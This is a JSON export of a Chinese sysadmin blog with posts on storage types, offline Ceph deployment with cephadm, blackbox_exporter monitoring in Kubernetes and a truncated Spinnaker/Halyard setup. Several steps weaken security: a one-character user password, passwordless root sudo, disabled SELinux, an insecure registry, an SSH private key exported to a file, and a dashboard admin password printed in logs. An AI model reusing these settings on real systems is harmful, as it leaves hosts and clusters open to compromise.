SAN），在操作系统层面会将其检测为原始磁盘。然后，对其进行格式化以在其上创建文件系统（ext4、XFS、NTFS\u0026hellip;）并开始将其用作可以存储数据的常规设备。\n块设备由集群作为较小块的集合进行管理（称为块或简称为块，因此得名）。这些块中的每一个都可以存储在由多台机器组成的存储集群中并存储在唯一的地址下。\n块存储由 1 和 0 组成；没有用于跟踪和可视化数据的文件系统或元数据；操作系统必须处理所有块的读/写。此选项的优点是吞吐量性能、低延迟和高 IOPS。通常，块最适合云平台基础设施（管理程序）和数据库，因为它具有高性能的趋势。\nFIle System 与块存储不同，基于文件的存储（NAS、文件系统）隐藏了与块存储相关的大部分复杂性。NAS 只是在网络上显示为驱动器号或目录，文件系统在存储和管理文件方面表现出色，而块存储缺乏更高级别的数据结构因为它能够轻松地通过网络共享文件，并且具有扩展能力。\nObject Storage 对象存储是在云计算行业为了存储大量非结构化数据的需求而创建的。数据不使用文件路径，而对象及其元数据的访问是使用标准 HTTP API 完成的\nReference [1] 스토리지 구성 DAS, NAS, SAN, IP-SAN\n[2] NAS vs SAN storage: Sự khác biệt và các ứng dụng phù hợp\n[3] direct attached storage\n[4] Advantages and Disadvantages of SAN\n","permalink":"https://www.oomkill.com/2023/08/acquaintance-stroage/","summary":"","title":"存储概念 - 存储类型对比"},{"content":"在配置好 github 仓库后，需要将对应的信息填写在 picgo 中，可以按照如下进行配置\n仓库名：xxxx/xxx 无需写 github.com/xxx/xxx\n分支名：直接填写分支名即可\nToken：在 github 上面配置的仓库 token\n设定存储路径：这里填写 github 仓库上传到的路径\n设置自定义域名：https://cdn.jsdelivr.net/gh/\u0026lt;github_username\u0026gt;/\u0026lt;repo_name\u0026gt;\n","permalink":"https://www.oomkill.com/2023/08/picgo-configure/","summary":"","title":"picgo + github 给 typora做图床"},{"content":"开篇常例 - 概述 Ceph 是一个广泛使用的开源存储平台。 它提供高性能、可靠性和可扩展性。 Ceph 分布式存储系统提供了对象存储、块存储和文件级存储。 Ceph 旨在提供无单点故障的分布式存储系统。\n在本教程中，将通过 ceph-adm 方式在 CentOS 7 上安装和构建 Ceph 集群。该实验的 Ceph 集群需要以下 Ceph 组件：\nCeph OSD (ceph-osd) - 处理数据存储、数据复制和恢复；通常一个Ceph集群至少需要两台 OSD 服务器 。 Ceph Monitor (ceph-mon) - 监视集群状态、OSD 映射和 CRUSH 映射，我们在这里与 cephadm 或 OSD 公用一个节点 Ceph 元数据服务器 (ceph-mds) - 这是使用 CephFS 所需的组件。 有了上面的条件，我们实验环境所需要的节点如下：\n三台服务器节点，CentOS 7 注：CentOS 7 可安装最高级别的 ceph 版本就是 O 版\n本教程中的服务器将使用以下主机名和 IP 地址：\n主机名 IP地址 作用 cephadmin 10.0.0.20 作为 ceph 管理节点，以管理与部署 ceph 集群 osd01 10.0.0.21 osd02 10.0.0.22 any any 作为 Ceph Client 的角色 注：所有 OSD 节点都需要两个分区，一个根（/）分区和一个空分区，稍后用作 Ceph 数据存储。\nREQUIREMENTS 使用 cephadm 安装 ceph 集群，所需要的先决条件如下:\n必要条件：\nPython 3，因为 cephadm 是一个 python3 脚本，所以需要每个节点都需要安装 python3 Systemd Podman or Docker：cephadm 安装的集群是一种以 “容器方式” 运行在对应的 ceph node 之上 LVM2：ceph OSD 是通过 LVM 来使用的，所以需要在每个 OSD 节点之上安装 LVM2 非必要条件：\nchrony or NTP：ceph 强依赖每个节点之上的时间 Internet 域名解析：ceph 集群对于 ceph node 来说是通过 hostname.random_str 识别的的 Step 1 配置节点 此步骤，将配置所有 3 个节点，为安装 Ceph 集群做好准备。 建议在所有节点上按照并运行以下所有命令。 并确保所有节点上都安装了 ssh-server。\n创建ceph用户(可选) useradd -d /home/cephuser -m cephuser echo 1|passwd cephuser --stdin 创建新用户后，我们需要为“cephuser” 配置 sudo。 他必须能够以 root 身份运行命令并无需密码即可获得 root 权限。\n运行以下命令为用户创建 sudoers 文件并使用 sed 编辑 /etc/sudoers 文件。\necho \u0026quot;cephuser ALL = (root) NOPASSWD:ALL\u0026quot; | sudo tee /etc/sudoers.d/cephuser chmod 0440 /etc/sudoers.d/cephuser sed -i s'/Defaults requiretty/#Defaults requiretty'/g /etc/sudoers Note：上述 通过 ceph-deploy 需要配置，cephadm 中没有强制\n安装配置 NTP 服务(可选) 因为分布式存储需要依赖时间，所以需要对所有 OSD 节点的时间保持一致，这里时间同步的软件可以随意选择，\nyum install -y ntp ntpdate ntp-doc ntpdate 0.us.pool.ntp.org hwclock --systohc systemctl enable ntpd.service systemctl start ntpd.service 可以不准备，随意启动一个服务即可，否则安装会出现如下提示\n$ cephadm bootstrap --mon-ip cephadmin Verifying podman|docker is present... Verifying lvm2 is present... Verifying time synchronization is in place... No time sync service is running; checked for ['chrony.service', 'chronyd.service', 'systemd-timesyncd.service', 'ntpd.service', 'ntp.service', 'ntpsec.service', 'openntpd.service'] Installing packages ['chrony']... Enabling unit chronyd.service No time sync service is running; checked for ['chrony.service', 'chronyd.service', 'systemd-timesyncd.service', 'ntpd.service', 'ntp.service', 'ntpsec.service', 'openntpd.service'] Repeating the final host check... docker (/usr/bin/docker) is present systemctl is present lvcreate is present Unit chronyd.service is enabled and running Host looks OK Cluster fsid: 19c90bda-2fb8-11ee-9128-000c293e5d57 Address: cephadmin is not a valid IP address Verifying IP cephadmin port 3300 ... Address: cephadmin is not a valid IP address Verifying IP cephadmin port 6789 ... Address: cephadmin is not a valid IP address Cannot infer CIDR network for mon IP `cephadmin` : 'cephadmin' does not appear to be an IPv4 or IPv6 address Cannot infer CIDR network for mon IP `cephadmin` : 'cephadmin' does not appear to be an IPv4 or IPv6 address ERROR: Cannot infer CIDR network. Pass --skip-mon-network to configure it later 关闭 SELInux 在所有 Ceph Node 节点上关闭 SELInux，可以根据下面命令使用 sed 操作\nsed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config 配置 Hosts 文件 这里主机名可以根据自己选择进行，如果你有 DNS 服务，那么也可以通过注册在 DNS 内的服务进行\n$ tee \u0026gt;\u0026gt; /etc/hosts \u0026lt;\u0026lt; EOF 10.0.0.20 ceph-octopus-cephadm 10.0.0.21 ceph-octopus-01 10.0.0.22 ceph-octopus-02 EOF 安装依赖 # centos 7 yum install -y python3 lvm2 docker-ce # centos 8 dnf install -y python3 lvm2 podman Step2 下载 cephadm 并 修改 cephadm 镜像地址 获取 cephadm 脚本 步骤参考了 ceph 官方安装手册 [1] ，需要注意的是 cephadm 脚本也是需要按照版本来的\ncurl --silent --remote-name --location https://github.com/ceph/ceph/raw/octopus/src/cephadm/cephadm chmod +x cephadm 这个步骤主要是为了使 cephadm 可以正常的拉去 ceph 镜像，你可以通过 docker load 方式导入到 ceph node 之上，但是 ceph 镜像必须通过私有镜像进行拉取（存在 reposig 认证）其他 ceph 组件（prometheus, node-exporter..）可以通过 docker load 导入\ncephadm 最上面几行写明了要拉去镜像的镜像仓库地址，可以在有互联网机器上下载好，push 到私有镜像仓库中，如果没有私有镜像仓库，可以 run 一个 docker registry ，这个步骤是强制的；其他组件是可以通过 docker load 方式获得\n$ head -20 cephadm #!/usr/bin/python3 # Default container images ----------------------------------------------------- DEFAULT_IMAGE = 'quay.io/ceph/ceph:v15' DEFAULT_IMAGE_IS_MASTER = False DEFAULT_PROMETHEUS_IMAGE = 'quay.io/prometheus/prometheus:v2.18.1' DEFAULT_NODE_EXPORTER_IMAGE = 'quay.io/prometheus/node-exporter:v0.18.1' DEFAULT_ALERT_MANAGER_IMAGE = 'quay.io/prometheus/alertmanager:v0.20.0' DEFAULT_GRAFANA_IMAGE = 'quay.io/ceph/ceph-grafana:6.7.4' # ------------------------------------------------------------------------------ LATEST_STABLE_RELEASE = 'octopus' DATA_DIR = '/var/lib/ceph' LOG_DIR = '/var/log/ceph' LOCK_DIR = '/run/cephadm' LOGROTATE_DIR = '/etc/logrotate.d' UNIT_DIR = '/etc/systemd/system' LOG_DIR_MODE = 0o770 DATA_DIR_MODE = 0o700 CONTAINER_INIT=False Run docker registry 拉去 docker registry\ndocker pull registry 镜像保存路径放置在当前工作目录中\nNote: 如果你没有独立的私有镜像仓库，那么请保留 docker registry，直到你不对 ceph 集群进行扩展\n执行下面命令，运行 docker registry\ndocker run \\ --detach \\ --name registry \\ --hostname registry \\ --volume $(pwd)/registry:/var/lib/registry/docker/registry \\ --publish 5000:5000 \\ --restart unless-stopped \\ registry:latest 在所有 ceph node 之上执行下面命令，需要自行替换 registry_host 部分\n现象：https://xxx:5000/v2/: http: server gave HTTP response to HTTPS client\ntee /etc/docker/daemon.json \u0026lt;\u0026lt; EOF { \u0026quot;insecure-registries\u0026quot;: [\u0026quot;registry_host:5000\u0026quot;] } EOF Step 3 引导一个新集群 在上面步骤都完成后，可以直接去引导一个新集群了\n可以选择性执行下面步骤\n这里是安装 ceph 客户端时需要用到的，例如 ceph-common, ceph-fuse 都会用到这些\n$ ./cephadm add-repo --release octopus cephadm 命令能够：\n引导一个新集群 使用 ceph cli 启动容器化的 shell 用于调试容器化的 ceph daemon O 版的安装命令是通过 github 下载，要注意的是，每个版本号的 cephadm 命令不通用\n# curl --silent --remote-name --location https://github.com/ceph/ceph/raw/pacific/src/cephadm/cephadm # chmod +x cephadm # ./cephadm add-repo --release octopus # install命令旨在将 cephadm 安装到环境变量中 # ./cephadm install 开始引导一个新的 ceph 集群 创建 Ceph 集群的第一步是在 Ceph 集群的管理几点上执行命令 cephadm bootstrap，这个命令的行为会创建 Ceph 集群中的第一个 \u0026ldquo;monitor\u0026rdquo; 守护进程，这需要提供一个 “IP地址” 而不可以是 “域名”。\n这里将 ceph monitor 部署在管理节点上了，以节省 Node 数量\n$ cephadm bootstrap --mon-ip 10.0.0.20 Verifying podman|docker is present... Verifying lvm2 is present... Verifying time synchronization is in place... Unit chronyd.service is enabled and running Repeating the final host check... docker (/usr/bin/docker) is present systemctl is present lvcreate is present Unit chronyd.service is enabled and running Host looks OK Cluster fsid: 420ccab4-2fb8-11ee-9f5c-000c293e5d57 Verifying IP 10.0.0.20 port 3300 ... Verifying IP 10.0.0.20 port 6789 ... Mon IP `10.0.0.20` is in CIDR network `10.0.0.0/24` Mon IP `10.0.0.20` is in CIDR network `10.0.0.0/24` Internal network (--cluster-network) has not been provided, OSD replication will default to the public_network Pulling container image quay.io/ceph/ceph:v17... Non-zero exit code 1 from /usr/bin/docker pull quay.io/ceph/ceph:v17 /usr/bin/docker: stderr Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? ERROR: Failed command: /usr/bin/docker pull quay.io/ceph/ceph:v17 [root@cephadmin ~]# systemctl start docker [root@cephadmin ~]# cephadm bootstrap --mon-ip 10.0.0.20 Verifying podman|docker is present... Verifying lvm2 is present... Verifying time synchronization is in place... Unit chronyd.service is enabled and running Repeating the final host check... docker (/usr/bin/docker) is present systemctl is present lvcreate is present Unit chronyd.service is enabled and running Host looks OK Cluster fsid: 4d128cbe-2fb8-11ee-8326-000c293e5d57 Verifying IP 10.0.0.20 port 3300 ... Verifying IP 10.0.0.20 port 6789 ... Mon IP `10.0.0.20` is in CIDR network `10.0.0.0/24` Mon IP `10.0.0.20` is in CIDR network `10.0.0.0/24` Internal network (--cluster-network) has not been provided, OSD replication will default to the public_network Pulling container image quay.io/ceph/ceph:v17... Ceph version: ceph version 17.2.6 (d7ff0d10654d2280e08f1ab989c7cdf3064446a5) quincy (stable) Extracting ceph user uid/gid from container image... Creating initial keys... Creating initial monmap... Creating mon... Waiting for mon to start... Waiting for mon... mon is available Assimilating anything we can from ceph.conf... Generating new minimal ceph.conf... Restarting the monitor... Setting mon public_network to 10.0.0.0/24 Wrote config to /etc/ceph/ceph.conf Wrote keyring to /etc/ceph/ceph.client.admin.keyring Creating mgr... Verifying port 9283 ... Waiting for mgr to start... Waiting for mgr... mgr not available, waiting (1/15)... mgr not available, waiting (2/15)... mgr not available, waiting (3/15)... mgr not available, waiting (4/15)... mgr is available Enabling cephadm module... Waiting for the mgr to restart... Waiting for mgr epoch 5... mgr epoch 5 is available Setting orchestrator backend to cephadm... Generating ssh key... Wrote public SSH key to /etc/ceph/ceph.pub Adding key to root@localhost authorized_keys... Adding host cephadmin... Deploying mon service with default placement... Deploying mgr service with default placement... Deploying crash service with default placement... Deploying prometheus service with default placement... Deploying grafana service with default placement... Deploying node-exporter service with default placement... Deploying alertmanager service with default placement... Enabling the dashboard module... Waiting for the mgr to restart... Waiting for mgr epoch 9... mgr epoch 9 is available Generating a dashboard self-signed certificate... Creating initial admin user... Fetching dashboard port number... Ceph Dashboard is now available at: URL: https://cephadmin:8443/ User: admin Password: eqlf3jh1i1 Enabling client.admin keyring and conf on hosts with \u0026quot;admin\u0026quot; label Saving cluster configuration to /var/lib/ceph/4d128cbe-2fb8-11ee-8326-000c293e5d57/config directory Enabling autotune for osd_memory_target You can access the Ceph CLI as following in case of multi-cluster or non-default config: sudo /usr/local/bin/cephadm shell --fsid 4d128cbe-2fb8-11ee-8326-000c293e5d57 -c /etc/ceph/ceph.conf -k /etc/ceph/ceph.client.admin.keyring Or, if you are only running a single cluster on this host: sudo /usr/local/bin/cephadm shell Please consider enabling telemetry to help improve Ceph: ceph telemetry on For more information see: https://docs.ceph.com/docs/master/mgr/telemetry/ Bootstrap complete. 成功后会看到 ceph dashboard 的界面，默认密码会输出到控制台，第一次登陆会要求修改默认密码\n在安装将生成一个最小的 ceph.conf 仅适用于引导阶段的配置文件，通过进入 mon 容器查看\n$ docker exec -it ceph-350494de-d23f-11ea-be85-525400d32681-mon.mon0 cat /etc/ceph/ceph.conf # 向 ceph 集群导入 osd node 向每个 node 导入 ssh key，下面的操作是通过进入管理容器执行的\nssh-copy-id -f -i /etc/ceph/ceph.pub root@*\u0026lt;new-host\u0026gt;* 添加一个主机到 ceph 集群\nceph orch host add *newhost* 部署一个新的 mon，你可以给新加入的主机打上标签\n# ceph orch host label add *\u0026lt;hostname\u0026gt;* mon ceph orch apply mon *\u0026lt;number-of-monitors\u0026gt;* 向集群部署新的组件\nceph orch apply mon *\u0026lt;number-of-monitors\u0026gt;* ceph orch apply mon *\u0026lt;host1,host2,host3,...\u0026gt;* 部署 osd damon 在新的主机之上\nceph orch daemon add osd *\u0026lt;host\u0026gt;*:*\u0026lt;device-path\u0026gt;* ceph orch daemon add osd host1:/dev/sdb 这是可以列出正在管理的服务器 cephadm 使用 host ls 命令：\nceph orch host ls 到此，如果你只使用 RDB 块存储，这里已经部署完成了，如果需要选择使用 文件存储 CephFS，或者对象存储 RGW，可以在另外部署相应的组件，部署的组件是根据按需使用进行部署\nosd device 命令也可以列出对应的设备\nceph orch device ls 在 Ceph 中一切存储的基础都是基于 RADOS 集群\nTroubleshooting TypeError: init() missing 2 required positional arguments: \u0026lsquo;hostname\u0026rsquo; and \u0026lsquo;addr\u0026rsquo; 现象：实际上输入了 hostname 和 addr 也是出现这个问题\n$ ceph orch host add ceph-octopus-01 Error EINVAL: Traceback (most recent call last): File \u0026quot;/usr/share/ceph/mgr/mgr_module.py\u0026quot;, line 1756, in _handle_command return self.handle_command(inbuf, cmd) File \u0026quot;/usr/share/ceph/mgr/orchestrator/_interface.py\u0026quot;, line 171, in handle_command return dispatch[cmd['prefix']].call(self, cmd, inbuf) File \u0026quot;/usr/share/ceph/mgr/mgr_module.py\u0026quot;, line 462, in call return self.func(mgr, **kwargs) File \u0026quot;/usr/share/ceph/mgr/orchestrator/_interface.py\u0026quot;, line 107, in \u0026lt;lambda\u0026gt; wrapper_copy = lambda *l_args, **l_kwargs: wrapper(*l_args, **l_kwargs) # noqa: E731 File \u0026quot;/usr/share/ceph/mgr/orchestrator/_interface.py\u0026quot;, line 96, in wrapper return func(*args, **kwargs) File \u0026quot;/usr/share/ceph/mgr/orchestrator/module.py\u0026quot;, line 356, in _add_host return self._apply_misc([s], False, Format.plain) File \u0026quot;/usr/share/ceph/mgr/orchestrator/module.py\u0026quot;, line 1092, in _apply_misc raise_if_exception(completion) File \u0026quot;/usr/share/ceph/mgr/orchestrator/_interface.py\u0026quot;, line 225, in raise_if_exception e = pickle.loads(c.serialized_exception) TypeError: __init__() missing 2 required positional arguments: 'hostname' and 'addr' 首先先将公钥分发到对应的 CEPH NODE 之上\nexport CEPH_HOSTNAME=root@ceph-octopus-01 # 获取公钥 ceph cephadm get-pub-key \u0026gt; /etc/ceph/ceph.pub # 分发公钥到对应 ceph node ssh-copy-id -f -i /etc/ceph/ceph.pub ${CEPH_HOSTNAME} # 尝试使用私钥是否可以连接到 ceph node ceph cephadm get-ssh-config \u0026gt; ssh_config ceph config-key get mgr/cephadm/ssh_identity_key \u0026gt; ~/cephadm_private_key chmod 0600 ~/cephadm_private_key ssh -F ssh_config -i ~/cephadm_private_key ${CEPH_HOSTNAME} 我解决的方式：实际上版本不对，更新版本就恢复了\nReference [1] install-cephadm\n[2] Object Request Broker Architecture\n[3] Cooperation for Open Systems Interconnection Networking in Europe\n","permalink":"https://www.oomkill.com/2023/07/02-1-install-ceph-with-cephadm/","summary":"","title":"使用cephadm纯离线安装Ceph集群"},{"content":"Hi, I am Cylon I am a programmer.\nAt the same time, I work full time is Kubernetes Engineer, If I were to express my occupation about this sector with three words, it would be engineering, research and practicality.\nI liked Linux, Network and Programming. In a free time, I generally study programming language and network technology 🙂\nabout me Event logs about me\n2015 Graduated from HBU 2016 PHP Programmer 2017 ~ 2020 Operations Engineer 2021 Go Programmer \u0026amp; study at TUP 2022 ~ Kubernetes Engineers You can =\u0026gt; see my projects on github/cylonchau Contact to me with email/telegram/twitter Thank you for reading this page.\n","permalink":"https://www.oomkill.com/about/","summary":"","title":"🙋🏻‍♂️关于"},{"content":"背景 在云原生环境中，特别是基于 Kubernetes，集群中的 “服务” 在与外部交互时，例如，一个外部的第三方 Web 服务/API 等，而监控这些不同的 endpoint 诊断服务可用性的一个关键点，这里将阐述基于 Kube-prometheus-stacks 如果做到可以监控外部 IP/URL，例如，HTTP/TCP/ICMP 等。\nblackbox_exporter 是 Prometheus 官方维护的 exporter之一，是提供一种用于检测 HTTP/S、DNS、TCP 和 ICMP 端点的可用性。\n基于 kube-prometheus-stack 安装 blackbox 本文使用了 helm 安装的 prometheus-community/prometheus-blackbox-exporter ，在安装前，需要自行修改要启动的 prober，与是否开启默认的 servicemonitor\nsecretConfig: false config: modules: ping: prober: icmp timeout: 5s icmp: preferred_ip_protocol: \u0026quot;ip4\u0026quot; http_2xx: prober: http timeout: 5s http: valid_http_versions: [\u0026quot;HTTP/1.1\u0026quot;, \u0026quot;HTTP/2.0\u0026quot;] follow_redirects: true preferred_ip_protocol: \u0026quot;ip4\u0026quot; 安装\nhelm install prometheus-blackbox-exporter -n monitoring . -f values.yaml 配置 servicemonitor blackbox-exporter 实现了多种探针，因此可以传递多个 endpoint 进行探测，下列是 ServiceMonitor 实现的检测外部IP/URL，使用了 icmp 探针，也就是说是在 blackbox-exporter 中配置的模块，探针通过抓取 Kubernetes service 下挂的 endpoint，通过访问 blackbox service 的 /probe 抓取暴露的指标 metrics\napiVersion: monitoring.coreos.com/v1 kind: ServiceMonitor metadata: name: blackbox-exporter-probe spec: endpoints: - interval: 1m path: /probe scrapeTimeout: 10s params: module: [tcp_prober] relabelings: - sourceLabels: [__address__] targetLabel: __param_target - targetLabel: __address__ replacement: black-prometheus-blackbox-exporter:9115 # is the name:port of the blackbox exporter service - sourceLabels: [__param_target] targetLabel: instance - action: labelmap regex: __meta_kubernetes_service_label_(.+) # specify to monitor kubernets services jobLabel: blackbox-exporter selector: matchLabels: app.kubernetes.io/action: probe # monitor the services only with this label 这个 ServiceMonitor 会通过标签匹配对应的 Kubernets service，标签为 app.kubernetes.io/action: probe所有 namespace 中的存在 这个 Label 的 service。 如果有需要，可以通过指定抓取的 namespace，使用namespaceSelector\n创建一个外部 service 这里使用了 Kubernetes 外部 service 方式将外部IP引入到内部\napiVersion: v1 kind: Service metadata: labels: app.kubernetes.io/action: probe name: icmp-prober spec: clusterIP: None ports: - name: db protocol: TCP port: 9100 targetPort: 9100 --- apiVersion: v1 kind: Endpoints metadata: labels: app.kubernetes.io/action: probe name: rahasak # name is same as service name subsets: - addresses: - ip: 10.0.0.4 - ip: 10.0.0.5 ports: - name: db protocol: TCP port: 9100 创建 servicemonitor 创建一个 ServiceMonitor 来探测每个 endpoint，使用了 icmp 探针来抓取 带有标签 app.kubernetes.io/action: probe 的Kubernets service\napiVersion: monitoring.coreos.com/v1 kind: ServiceMonitor metadata: name: blackbox-exporter spec: endpoints: - interval: 1m path: /probe scrapeTimeout: 10s params: module: [ping] relabelings: - sourceLabels: [__address__] targetLabel: __param_target - targetLabel: __address__ # blackbox_service_name.namespace:port replacement: prometheus-blackbox-prometheus-blackbox-exporter:9115 - sourceLabels: [__param_target] targetLabel: instance - action: labelmap regex: __meta_kubernetes_endpoints_label_(.+) # specify to monitor kubernetes endpoints jobLabel: blackbox-exporter selector: matchLabels: app.kubernetes.io/action: probe # monitor endpoints only with the given label Notes blackbox_exporter 如果想要使用 icmp 探针，必须拥有 root 权限，直接修改 runAsGroup: 0 即可\n对于 直接使用 servicemonitor 中的 endpoint 只能识别出一个 IP，原因是，balckbox 暴漏的指标需要带参数访问，下列格式\n\u0026quot;http://10.104.202.8:9115/probe?module=ping\u0026amp;target=10.0.0.5\u0026quot; 而传入多个 target 没有用，只会返回第一个 target 的指标，所以说会出现多个 endpoint 只会出现一个，同样的问题，如果 service 设置为 ClusterIP，也会只有一个指标，必须 type: None 才可以，这就是只有多个 endpoint 才会在拉去指标时请求多个 balckbox exporter 的 API\napiVersion: monitoring.coreos.com/v1 kind: ServiceMonitor metadata: name: blackbox-probe-tcp namespace: default labels: release: kube-prometheus-stacks spec: endpoints: - port: http path: /probe interval: 5s scrapeTimeout: 5s params: module: - ping target: - 10.0.0.4 - 10.0.0.5 relabelings: - action: replace regex: (.*) replacement: $1 sourceLabels: - __meta_kubernetes_service_label_cluster targetLabel: cluster - action: replace regex: (.*) replacement: $1 sourceLabels: - __param_module targetLabel: module - action: labelmap regex: (.*) replacement: $1 sourceLabels: [__param_target] targetLabel: __address__ selector: matchLabels: app.kubernetes.io/instance: prometheus-blackbox 目前暂未找到有效的解决方法，但是在清单配置多个 endpoint 就出现多条 serivcemonitor 记录，持续更进该问题，可能可以通过 additionalScrapeConfigs 可以解决该问题\nReference [1] Monitor Kubernets Services/Endpoints with Prometheus Blackbox Exporter\n[2] Prometheus Operator + Blackbox exporter\n","permalink":"https://www.oomkill.com/2023/07/blackbox_exporter-in-k8s/","summary":"","title":"在 Kubernetes 集群中使用 blackbox exporter监控外部IP"},{"content":"Prerequisites 具有一个 Kubernetes 集群 以部署 Spinnaker 可运行 Docker 的环境 (1 vCPU, 3.75 GB) 或者是 Ubuntu，用以安装 Halyard (用于 spinnaker 的服务) 对象存储 (MinIO)，用于持久化 Spinnaker 的数据 对象存储的 Bucket 的访问账号 安装执行步骤 安装 Halyard 可以直接使用 Docker 方式安装，这个没什么必要性，就是管理工具而已，参考附录1 [1]\n首先创建映射目录\nmkdir ~/.hal -pv mkdir ~/.kubeconfig -pv 然后执行 docker run 运行容器\ndocker run -d -p 8084:8084 -p 9000:9000 \\ --name halyard --rm \\ -v ~/.hal:/home/spinnaker/.hal \\ -v ~/.kubeconfig:/home/spinnaker/.kube \\ -v /usr/local/bin:/usr/local/sbin \\ -v /etc/kubernetes/auth/admin.conf:/home/spinnaker/.kube/config \\ us-docker.pkg.dev/spinnaker-community/docker/halyard:stable 因为 docker 环境不能重启服务，需要修改配置文件，这里可以在外部创建一个配置文件来映射进去，这里后面会说到 GCS 的问题\n$ docker run -it --rm us-docker.pkg.dev/spinnaker-community/docker/halyard:stable cat /opt/halyard/config/halyard.yml \u0026gt; /tmp/halyard.yml 修改 spinnaker 部分的配置，将 enabled: true ，改为 enabled: false\nspinnaker: artifacts: debian: https://us-apt.pkg.dev/projects/spinnaker-community docker: us-docker.pkg.dev/spinnaker-community/docker config: input: gcs: enabled: false writerEnabled: false bucket: halconfig 然后将输出的配置文件保存到宿主机，而后映射到容器内即可\ndocker run -d -p 8084:8084 -p 9000:9000 \\ --name halyard --rm \\ -v ~/.hal:/home/spinnaker/.hal \\ -v ~/.kubeconfig:/home/spinnaker/.kube \\ -v /usr/local/bin:/usr/local/sbin \\ -v /etc/kubernetes/auth/admin.conf:/home/spinnaker/.kube/config \\ -v /tmp/halyard.yml:/opt/halyard/config/halyard.yml \\ us-docker.pkg.dev/spinnaker-community/docker/halyard:stable 安装kubectl 这部分在上一章中注明了挂载 kubectl 的路径\n使用 Docker 运行的 Halyard 可以直接挂在 kubectl 到 容器内就可以了，halyard 默认的路径在 /usr/local/bin 只要避免和这个路径冲突就可以了。\nhalyard 中附带的 kubectl 不一定与你的集群版本一致\n最后进入容器就可以管理 spinnaker 了\ndocker exec -it halyard bash 生成一个 Halyard config [3] 离线安装时，需要生成一个 Halyard config 文件，默认在 ~/.hal/config\nhal config version edit --version local:1.19.2 Notes:\n如果是选择离线安装或者 Local 方式安装，那么 local 关键字必须加 如果主机没有网，此时需要指定参数 --no-validate 来控制关闭验证，验证通常要联网 对于执行大部分的 hal 命令都会在 ~/.hal/config 生成配置文件 选择云供应商 这里可以指选择一个 Kubernetes 集群将其添加到 Halyard config 中\n注意，这里需要时 Kubectl 可以正常请求集群，即需要 kubectl 与 kubeconfig\n但在选择 Kubernetes 作为 Halyard 的 provider 之前，可以在 Kubernetes 中创建一个新的 service 以在 Halyard 中使用。\n# Run in Halyard container CONTEXT=$(kubectl config current-context) kubectl apply --context $CONTEXT \\ -f https://spinnaker.io/downloads/kubernetes/service-account.yml TOKEN=$(kubectl get secret --context $CONTEXT \\ $(kubectl get serviceaccount spinnaker-service-account \\ --context $CONTEXT \\ -n spinnaker \\ -o jsonpath='{.secrets[0].name}') \\ -n spinnaker \\ -o jsonpath='{.data.token}' | base64 --decode) kubectl config set-credentials ${CONTEXT}-token-user --token $TOKEN kubectl config set-context $CONTEXT --user ${CONTEXT}-token-user 启用 kubernetes，并配置使用的 kubernetes 用户\n# Run in Halyard container hal config provider kubernetes enable ACCOUNT=\u0026quot;my-k8s-account\u0026quot; hal config provider kubernetes account add ${ACCOUNT} \\ --context ${CONTEXT} Halyard 有几种部署 Spinnaker 服务的选项，例如Local, git 和 Distributed，这里使用 Distributed 模式，将 Spinnaker 以分布式方式部署到 Kubernetes内。\nhal config deploy edit --type distributed --account-name $ACCOUNT 配置S3存储 Spinnaker 需要外部存储，例如 S3 对象存储置，为此，我使用 Minio 作为外部存储服务。这里使用 docker 进行部署，作为学习，也可以使用 minIO 官方提供的 minIO-dev [4]，可以快速在 Kubernetes 集群上部署一个单实例的 minIO\n# System MINIO_ROOT_USER=$(\u0026lt; /dev/urandom tr -dc a-z | head -c${1:-4}) MINIO_ROOT_PASSWORD=$(\u0026lt; /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-8}) MINIO_PORT=\u0026quot;9010\u0026quot; # Start the container docker run -it -d --rm -v ~/.minio-data/:/data --name minio-4-spinnaker -p ${MINIO_PORT}:${MINIO_PORT} \\ -e MINIO_ROOT_USER=${MINIO_ROOT_USER} -e MINIO_ROOT_PASSWORD=${MINIO_ROOT_PASSWORD} \\ minio/minio server /data --address :${MINIO_PORT} # This information is used in next {.1} echo \u0026quot; MINIO_ROOT_USER=${MINIO_ROOT_USER} MINIO_ROOT_PASSWORD=${MINIO_ROOT_PASSWORD} ENDPOINT=http://$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' minio-4-spinnaker):${MINIO_PORT} \u0026quot; 如果需要开启，那么需要在目录 ~/.hal/default/profiles/front50-local.yml 创建文件\nspinnaker: s3: versioning: false 然后使用以下命令进行配置到 halyard config 文件\nENDPOINT=http://10.0.2.4:9000 MINIO_ACCESS_KEY=minio MINIO_SECRET_KEY=minio123 echo $MINIO_SECRET_KEY | hal config storage s3 edit --endpoint $ENDPOINT \\ --access-key-id $MINIO_ACCESS_KEY \\ --secret-access-key hal config storage edit --type s3 生成一个BOM文件 找一台有外网的主机，执行下列命令\nhal version bom 1.19.2 -q -o yaml Note: 如果开启了 gcs.enabled: true 需要重新启动一个容器，因为这个步骤需要联网查询\n$ DOCKERID=`docker run -d --rm \\ -v ~/.hal:/home/spinnaker/.hal \\ us-docker.pkg.dev/spinnaker-community/docker/halyard:stable` $ docker exec -it ${DOCKERID} hal version bom 1.19.2 -q -o yaml \u0026amp;\u0026amp; docker stop ${DOCKERID} 将输出的文件保存在 halyard 容器内 ~/.hal/.boms/bom/{version}.yml ，将 {version} 替换为你安装的版本，例如这里为 1.19.2\n其次，要在本地执行此操作的容器内，需要在 halconfig 目录下有对应的 BOM 清单，清单格式如下：\n$ tree ~/.hal/.boms/ /root/.hal/.boms/ ├── bom │ └── 1.19.2.yml ├── clouddriver │ └── clouddriver.yml ├── deck │ └── settings.js ├── echo │ └── echo.yml ├── fiat │ └── fiat.yml ├── front50 │ └── front50.yml ├── gate │ └── gate.yml ├── igor │ └── igor.yml ├── kayenta │ └── kayenta.yml ├── orca │ └── orca.yml └── rosco └── rosco.yml 这些文件夹需要自行创建，并且里面的配置文件也需要自行创建，如果不知道格式如何，可以参考 Spinnaker github 仓库上，每一个上面的文件夹都是一个项目仓库，而这些仓库的根目录都存在一个 halconfig 目录，此时需要你将对应的文件保存到对应目录下，例如，clouddriver 文件夹需要选择 github.com/spinnaker/clouddriver 项目，而配置文件需要选择 {service_name}.yml 为命名的，例如 clouddriver 就需要选择 clouddriver.yml，这个需要自行下载。\n可以使用下列脚本进行生成这些配置文件（需要上网）\n#!/bin/bash #################################################################################### # Install Spinnaker scripts for CentOS # #################################################################################### set -e START_TIME=`date +%s` export 